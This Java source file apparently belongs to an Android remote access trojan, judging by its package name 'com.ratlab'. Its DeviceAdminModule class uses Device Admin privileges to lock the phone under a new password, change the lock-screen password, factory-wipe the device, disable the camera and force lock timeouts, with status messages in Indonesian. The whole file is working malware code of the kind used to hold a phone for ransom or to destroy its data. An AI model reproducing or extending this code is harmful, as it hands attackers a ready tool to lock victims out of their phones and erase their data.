package com.ratlab;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;

public class DeviceAdminModule {

    private final Context ctx;
    private final DevicePolicyManager dpm;
    private final ComponentName admin;

    public DeviceAdminModule(Context ctx) {
        this.ctx = ctx;
        this.dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.admin = new ComponentName(ctx, AdminReceiver.class);
    }

    public String lock(String password) {
        try {
            if (!dpm.isAdminActive(admin)) return "Device Admin belum aktif";
            if (password != null && !password.isEmpty()) {
                dpm.resetPassword(password, 0);
            }
            dpm.lockNow();
            return "HP terkunci" + (password != null && !password.isEmpty() ? " dengan password" : "");
        } catch (Exception e) {
            return "Error lock: " + e.getMessage();
        }
    }

    public String reset(String password) {
        try {
            if (!dpm.isAdminActive(admin)) return "Device Admin belum aktif";
            dpm.wipeData(0);
            return "Reset pabrik dijalankan";
        } catch (Exception e) {
            return "Error reset: " + e.getMessage();
        }
    }

    public String changePassword(String password) {
        try {
            if (!dpm.isAdminActive(admin)) return "Device Admin belum aktif";
            dpm.resetPassword(password, 0);
            return "Password lock screen diganti";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String disableCamera(boolean disable) {
        try {
            if (!dpm.isAdminActive(admin)) return "Device Admin belum aktif";
            dpm.setCameraDisabled(admin, disable);
            return disable ? "Kamera dimatikan" : "Kamera diaktifkan";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    public String forceLock(int minutes) {
        try {
            if (!dpm.isAdminActive(admin)) return "Device Admin belum aktif";
            dpm.setMaximumTimeToLock(admin, minutes * 60_000L);
            return "Force lock: " + minutes + " menit";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
